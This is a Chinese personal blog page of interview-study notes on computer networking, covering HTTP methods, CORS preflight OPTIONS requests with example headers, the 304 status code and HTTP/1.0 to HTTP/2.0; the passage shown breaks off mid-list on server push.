<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>计算机网络 | WeCcRy</title>
    <meta name="description" content="wangy的个人博客">
    <meta name="generator" content="VitePress v1.6.3">
    <link rel="preload stylesheet" href="/blog/assets/style.s3Ysg1kI.css" as="style">
    <link rel="preload stylesheet" href="/blog/vp-icons.css" as="style">
    
    <script type="module" src="/blog/assets/app.CbBGLRjX.js"></script>
    <link rel="preload" href="/blog/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/blog/assets/chunks/theme.DTG5oq33.js">
    <link rel="modulepreload" href="/blog/assets/chunks/framework.z0sZ1NT9.js">
    <link rel="modulepreload" href="/blog/assets/articles_practice_八股_计算机网络.md.BJxRBiZD.lean.js">
    <link rel="icon" href="/blog/weblogo.ico">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-64b1ecdf><!--[--><!--]--><!--[--><span tabindex="-1" data-v-48bb7e96></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-48bb7e96>Skip to content</a><!--]--><!----><header class="VPNav" data-v-64b1ecdf data-v-2d277072><div class="VPNavBar" data-v-2d277072 data-v-f2ceaa25><div class="wrapper" data-v-f2ceaa25><div class="container" data-v-f2ceaa25><div class="title" data-v-f2ceaa25><div class="VPNavBarTitle has-sidebar" data-v-f2ceaa25 data-v-1248edcf><a class="title" href="/blog/" data-v-1248edcf><!--[--><!--]--><!----><span data-v-1248edcf>WeCcRy</span><!--[--><!--]--></a></div></div><div class="content" data-v-f2ceaa25><div class="content-body" data-v-f2ceaa25><!--[--><!--]--><div class="VPNavBarSearch search" data-v-f2ceaa25><!----></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-f2ceaa25 data-v-dd031b7e><span id="main-nav-aria-label" class="visually-hidden" data-v-dd031b7e> Main Navigation </span><!--[--><!--[--><div class="VPFlyout VPNavBarMenuGroup" data-v-dd031b7e data-v-f332ca48><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-f332ca48><span class="text" data-v-f332ca48><!----><span data-v-f332ca48>书籍</span><span class="vpi-chevron-down text-icon" data-v-f332ca48></span></span></button><div class="menu" data-v-f332ca48><div class="VPMenu" data-v-f332ca48 data-v-988cb077><div class="items" data-v-988cb077><!--[--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/books/daily/2025.html" data-v-b039becf><!--[--><span data-v-b039becf>日常</span><!--]--></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/books/pro/vueDesign.html" data-v-b039becf><!--[--><span data-v-b039becf>技术</span><!--]--></a></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--[--><div class="VPFlyout VPNavBarMenuGroup" data-v-dd031b7e data-v-f332ca48><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-f332ca48><span class="text" data-v-f332ca48><!----><span data-v-f332ca48>前端</span><span class="vpi-chevron-down text-icon" data-v-f332ca48></span></span></button><div class="menu" data-v-f332ca48><div class="VPMenu" data-v-f332ca48 data-v-988cb077><div class="items" data-v-988cb077><!--[--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/frontend/vue.html" data-v-b039becf><!--[--><span data-v-b039becf>Vue3</span><!--]--></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/frontend/React18.html" data-v-b039becf><!--[--><span data-v-b039becf>React18</span><!--]--></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/frontend/typescript.html" data-v-b039becf><!--[--><span data-v-b039becf>Typescript</span><!--]--></a></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--[--><div class="VPFlyout VPNavBarMenuGroup" data-v-dd031b7e data-v-f332ca48><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-f332ca48><span class="text" data-v-f332ca48><!----><span data-v-f332ca48>实践</span><span class="vpi-chevron-down text-icon" data-v-f332ca48></span></span></button><div class="menu" data-v-f332ca48><div class="VPMenu" data-v-f332ca48 data-v-988cb077><div class="items" data-v-988cb077><!--[--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/html.html" data-v-b039becf><!--[--><span data-v-b039becf>基础</span><!--]--></a></div><!--]--><!--[--><div class="VPMenuLink" data-v-988cb077 data-v-b039becf><a class="VPLink link" href="/blog/articles/practice/projection/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%85%83%E7%B4%A0%E5%85%B1%E4%BA%AB.html" data-v-b039becf><!--[--><span data-v-b039becf>工程化</span><!--]--></a></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-f2ceaa25 data-v-781248de><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-781248de data-v-74a79a56 data-v-e3ae7890><span class="check" data-v-e3ae7890><span class="icon" data-v-e3ae7890><!--[--><span class="vpi-sun sun" data-v-74a79a56></span><span class="vpi-moon moon" data-v-74a79a56></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-f2ceaa25 data-v-faa0c4f5 data-v-737a3a3e><!--[--><a class="VPSocialLink no-icon" href="https://github.com/WeCcRy" aria-label="github" target="_blank" rel="noopener" data-v-737a3a3e data-v-87992898><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-f2ceaa25 data-v-9251a751 data-v-f332ca48><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-f332ca48><span class="vpi-more-horizontal icon" data-v-f332ca48></span></button><div class="menu" data-v-f332ca48><div class="VPMenu" data-v-f332ca48 data-v-988cb077><!----><!--[--><!--[--><!----><div class="group" data-v-9251a751><div class="item appearance" data-v-9251a751><p class="label" data-v-9251a751>Appearance</p><div class="appearance-action" data-v-9251a751><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-9251a751 data-v-74a79a56 data-v-e3ae7890><span class="check" data-v-e3ae7890><span class="icon" data-v-e3ae7890><!--[--><span class="vpi-sun sun" data-v-74a79a56></span><span class="vpi-moon moon" data-v-74a79a56></span><!--]--></span></span></button></div></div></div><div class="group" data-v-9251a751><div class="item social-links" data-v-9251a751><div class="VPSocialLinks social-links-list" data-v-9251a751 data-v-737a3a3e><!--[--><a class="VPSocialLink no-icon" href="https://github.com/WeCcRy" aria-label="github" target="_blank" rel="noopener" data-v-737a3a3e data-v-87992898><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-f2ceaa25 data-v-304c812d><span class="container" data-v-304c812d><span class="top" data-v-304c812d></span><span class="middle" data-v-304c812d></span><span class="bottom" data-v-304c812d></span></span></button></div></div></div></div><div class="divider" data-v-f2ceaa25><div class="divider-line" data-v-f2ceaa25></div></div></div><!----></header><div class="VPLocalNav has-sidebar empty" data-v-64b1ecdf data-v-853c91b2><div class="container" data-v-853c91b2><button class="menu" aria-expanded="false" aria-controls="VPSidebarNav" data-v-853c91b2><span class="vpi-align-left menu-icon" data-v-853c91b2></span><span class="menu-text" data-v-853c91b2>Menu</span></button><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-853c91b2 data-v-26c60acc><button data-v-26c60acc>Return to top</button><!----></div></div></div><aside class="VPSidebar" data-v-64b1ecdf data-v-8bccc691><div class="curtain" data-v-8bccc691></div><nav class="nav" id="VPSidebarNav" aria-labelledby="sidebar-aria-label" tabindex="-1" data-v-8bccc691><span class="visually-hidden" id="sidebar-aria-label" data-v-8bccc691> Sidebar Navigation </span><!--[--><!--]--><!--[--><div class="no-transition group" data-v-bc5cec6f><section class="VPSidebarItem level-0 has-active" data-v-bc5cec6f data-v-c2678f92><div class="item" role="button" tabindex="0" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><h2 class="text" data-v-c2678f92>基础</h2><!----></div><div class="items" data-v-c2678f92><!--[--><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/html.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>HTML</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/css.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>CSS</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/js.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>JavaScript</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/ts.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>TypeScript</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/vue.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>Vue</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/%E6%89%8B%E6%92%95.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>手撕</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>计算机网络</p><!--]--></a><!----></div><!----></div><div class="VPSidebarItem level-1 is-link" data-v-c2678f92 data-v-c2678f92><div class="item" data-v-c2678f92><div class="indicator" data-v-c2678f92></div><a class="VPLink link link" href="/blog/articles/practice/%E5%85%AB%E8%82%A1/%E5%B7%A5%E7%A8%8B%E5%8C%96.html" data-v-c2678f92><!--[--><p class="text" data-v-c2678f92>工程化</p><!--]--></a><!----></div><!----></div><!--]--></div></section></div><!--]--><!--[--><!--]--></nav></aside><div class="VPContent has-sidebar" id="VPContent" data-v-64b1ecdf data-v-e20be746><div class="VPDoc has-sidebar has-aside" data-v-e20be746 data-v-979c8a31><!--[--><!--]--><div class="container" data-v-979c8a31><div class="aside" data-v-979c8a31><div class="aside-curtain" data-v-979c8a31></div><div class="aside-container" data-v-979c8a31><div class="aside-content" data-v-979c8a31><div class="VPDocAside" data-v-979c8a31 data-v-df29e25d><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-df29e25d data-v-af12374f><div class="content" data-v-af12374f><div class="outline-marker" data-v-af12374f></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-af12374f>On this page</div><ul class="VPDocOutlineItem root" data-v-af12374f data-v-c1c3f97b><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-df29e25d></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-979c8a31><div class="content-container" data-v-979c8a31><!--[--><!--]--><main class="main" data-v-979c8a31><div style="position:relative;" class="vp-doc _blog_articles_practice_%E5%85%AB%E8%82%A1_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C" data-v-979c8a31><div><h1 id="计算机网络" tabindex="-1">计算机网络 <a class="header-anchor" href="#计算机网络" aria-label="Permalink to &quot;计算机网络&quot;">​</a></h1><h2 id="get和post的区别" tabindex="-1">Get和Post的区别 <a class="header-anchor" href="#get和post的区别" aria-label="Permalink to &quot;Get和Post的区别&quot;">​</a></h2><p>Post 和 Get 是 HTTP 请求的两种方法，其区别如下：</p><ul><li><strong>应用场景</strong>:GET 请求是一个幂等（即多次请求返回值相同）的请求，一般 Get 请求用于对服务器资源不会产生影响的场景，比如说请求一个网页的资源。而 Post 不是一个幂等的请求，一般用于对服务器资源会产生影响的情景，比如注册用户这一类的操作。</li><li><strong>是否缓存</strong>:因为两者应用场景不同，浏览器一般会对 Get 请求缓存，但很少对 Post 请求缓存。</li><li><strong>发送的报文格式</strong>:Get 请求的报文中实体部分为空，Post 请求的报文中实体部分一般为向服务器发送的数据。</li><li><strong>安全性</strong>:Get 请求可以将请求的参数放入 url 中向服务器发送，这样的做法相对于 Post 请求来说是不太安全的，因为请求的 url 会被保留在历史记录中。</li><li><strong>请求长度</strong>:浏览器由于对 url 长度的限制，所以会影响 get 请求发送数据时的长度。这个限制是浏览器规定的，并不是 RFC 规定的。</li><li><strong>参数类型</strong>:post 的参数传递支持更多的数据类型。</li></ul><table tabindex="0"><thead><tr><th><strong>方法</strong></th><th><strong>幂等性</strong></th><th><strong>参数位置</strong></th><th><strong>缓存性</strong></th><th><strong>安全性</strong></th><th><strong>核心用途</strong></th><th><strong>典型场景</strong></th><th><strong>响应状态码</strong></th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>✅（幂等）</td><td>URL</td><td>✅（可缓存）</td><td>低（参数暴露）</td><td>获取资源当前状态</td><td>查询数据列表、获取详情页</td><td>200 OK</td></tr><tr><td><strong>POST</strong></td><td>❌（非幂等）</td><td>请求体</td><td>❌（不可缓存）</td><td>高（参数隐藏）</td><td>创建新资源、提交数据</td><td>用户注册、提交表单、上传文件</td><td>201 Created</td></tr><tr><td><strong>PUT</strong></td><td>✅（幂等）</td><td>请求体</td><td>❌</td><td>高</td><td>完整替换资源（需提供全部数据）</td><td>更新用户完整信息、覆盖配置文件</td><td>200 OK/204 No Content</td></tr><tr><td><strong>DELETE</strong></td><td>✅（幂等）</td><td>URL / 请求体</td><td>❌</td><td>高</td><td>删除指定资源</td><td>删除用户、商品或文件</td><td>204 No Content</td></tr><tr><td><strong>PATCH</strong></td><td>❌/✅*</td><td>请求体</td><td>❌</td><td>高</td><td>部分更新资源（仅传修改字段）</td><td>修改用户邮箱、密码或部分属性</td><td>200 OK/204 No Content</td></tr><tr><td><strong>HEAD</strong></td><td>✅</td><td>URL</td><td>✅</td><td>低</td><td>获取资源元信息（仅响应头）</td><td>检查文件大小、验证缓存有效性</td><td>200 OK</td></tr><tr><td><strong>OPTIONS</strong></td><td>✅</td><td>URL</td><td>❌</td><td>高</td><td>获取服务器支持的请求方法和 CORS 权限</td><td>浏览器跨域预检请求、检查 API 支持的方法</td><td>200 OK</td></tr></tbody></table><h2 id="options预检请求" tabindex="-1">OPTIONS预检请求 <a class="header-anchor" href="#options预检请求" aria-label="Permalink to &quot;OPTIONS预检请求&quot;">​</a></h2><p>当浏览器发起的跨域请求满足 “<strong>非简单请求</strong>” 条件时，会先自动发送一个 OPTIONS 请求到目标服务器，确认服务器是否允许该跨域操作。只有 OPTIONS 请求返回 “允许”，浏览器才会发送真正的 GET/POST/PUT 等请求。</p><p><strong>非简单请求</strong>指的是一下条件满足任一的请求:</p><ul><li>请求方法不是 GET、POST、HEAD（比如用 PUT、DELETE、PATCH 等）</li><li>请求头包含自定义字段（比如 Authorization、Content-Type: application/json、X-Token 等，注意：Content-Type: application/x-www-form-urlencoded/multipart/form-data/text/plain 属于简单头，不触发预检）</li><li>请求体是 application/json 格式（而非表单默认的 x-www-form-urlencoded）</li></ul><p>预检请求头示例：</p><div class="language-js vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">OPTIONS</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">api</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">user </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HTTP</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Host</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: api.example.com  # 目标服务器域名</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Origin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">//a.com   # 跨域场景下，当前前端域名（浏览器自动加）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Access</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Control</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Request</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Method</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  # 告诉服务器：我接下来要发 </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> 请求（预检核心字段）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Access</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Control</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Request</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Headers</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: Content</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Type  # 告诉服务器：我接下来要带 Content</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Type 头（预检核心字段）</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Connection</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: keep</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">alive</span></span></code></pre></div><p>预检响应头示例:</p><div class="language-js vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HTTP</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 204</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> No Content  # </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">204</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> 状态码表示“成功但无响应体”（符合 </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">OPTIONS</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> 探测性质）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Access</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Control</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Allow</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Origin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">//a.com  # 允许的跨域来源（必须和请求的 Origin 匹配）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Access</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Control</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Allow</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Methods</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">GET</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">PUT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">DELETE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  # 服务器允许的所有 </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> 方法</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Access</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Control</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Allow</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Headers</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: Content</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Type, Authorization  # 服务器允许的请求头</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Access</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Control</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Max</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Age</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">86400</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  # 预检结果的缓存时间（秒），</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> 天内重复跨域请求无需再发 </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">OPTIONS</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Date</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: Tue, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">26</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Aug </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2025</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 08</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">00</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> GMT</span></span></code></pre></div><h2 id="_304状态码" tabindex="-1">304状态码 <a class="header-anchor" href="#_304状态码" aria-label="Permalink to &quot;304状态码&quot;">​</a></h2><p>服务器为了提高网站访问速度，对之前访问的部分页面指定缓存机制，当客户端在此对这些页面进行请求，服务器会根据缓存内容判断页面与之前是否相同，若相同便直接返回304，此时客户端调用缓存内容，不必进行二次下载。</p><p>状态码304不应该认为是一种错误，而是对客户端<strong>有缓存情况下</strong>服务端的一种响应。</p><p>搜索引擎蜘蛛会更加青睐内容源更新频繁的网站。通过特定时间内对网站抓取返回的状态码来调节对该网站的抓取频次。若网站在一定时间内一直处于304的状态，那么蜘蛛可能会降低对网站的抓取次数。相反，若网站变化的频率非常之快，每次抓取都能获取新内容，那么日积月累，的回访率也会提高。</p><p><strong>产生较多304状态码的原因：</strong></p><ul><li>页面更新周期长或不更新</li><li>纯静态页面或强制生成静态html</li></ul><p><strong>304状态码出现过多会造成以下问题：</strong></p><ul><li>网站快照停止；</li><li>收录减少；</li><li>权重下降。</li></ul><h2 id="http协议-从http1-0到http3-0" tabindex="-1">HTTP协议，从HTTP1.0到HTTP3.0 <a class="header-anchor" href="#http协议-从http1-0到http3-0" aria-label="Permalink to &quot;HTTP协议，从HTTP1.0到HTTP3.0&quot;">​</a></h2><p>首先HTTP1.0最大的问题在于连接的持续性，其每一次发送请求都会重新走TCP连接（三次握手，四次挥手）</p><p>而HTTP1.1中，可以将连接改为持久连接，即采用一次TCP连接来发送多个http请求，但是后端服务器接受到请求的时候，受限于协议要求，必须要按照请求的顺序来响应请求，这就导致了如果服务器需要较长的时间处理前面的请求，会导致后面的请求被阻塞，浪费时间。且由于HTTP1.1中头部是明文传输的，所有会导致头部的数据量比较大，再加上多个请求中的头部可能完全一致，重复发送会导致带宽的浪费。</p><p>HTTP1.1 有并发连接的请求数量限制(8个左右)</p><p>HTTP1.0和HTTP1.1都需要外挂TLS协议</p><p><strong>HTTP2.0</strong></p><p>首先通过HPACK算法（为高频出现的头部信息使用哈夫曼编码生成一份索引表，写入HTTP2框架，同时使用动态表来扩充头部信息）来压缩头部。</p><p>其次，将HTTP1中的文本格式改成二进制帧，帧包含帧头和帧数据，帧数据存放的就是HPACK压缩后的头部和数据</p><p>通过并发传输解决了队头阻塞的问题，一个TCP连接中包含多个stream，stream中包含多个messgae，每一个message中又包含多个frame，同时解决了并发连接的数量问题，HTTP2下，只有一个TCP连接，而在这一个连接中进行多路复用</p><ul><li><strong>Stream</strong>：是连接中的一个虚拟信道，有唯一整数标识符，客户端发起的流具有<strong>奇数</strong> ID，服务器端发起的流具有偶数 ID。它承载着双向的消息传输，并且具有一些额外的信息，如优先级等，用于控制服务器对资源的分配。</li><li><strong>Message</strong>：即 HTTP 的请求或响应，是一个逻辑上的完整数据单元，由一系列的 Header Frames 和 Data Frames 组成。Header Frames 包含了与 HTTP 请求或响应头相关的信息，Data Frames 则包含了消息体的信息。</li><li><strong>Frame</strong>：包含类型（Type）、长度（Length）、标记（Flags）、流标识（Stream ID）和有效载荷（Payload）等部分。Type 表示帧的类型，如 Headers 帧用于传输头部信息，Data 帧用于传输消息体数据等；Length 表示帧的长度；Flags 用于携带一些额外的控制信息；Stream ID 用于标识该帧所属的流；Payload 则是帧实际携带的数据内容。</li></ul><p>不同stream之间可以乱序发送和接受，但是同一个stream内部必须是有序的</p><p>此外，还通过<strong>服务器推送</strong>来推送可能用到的资源：</p><ul><li>服务器端操作 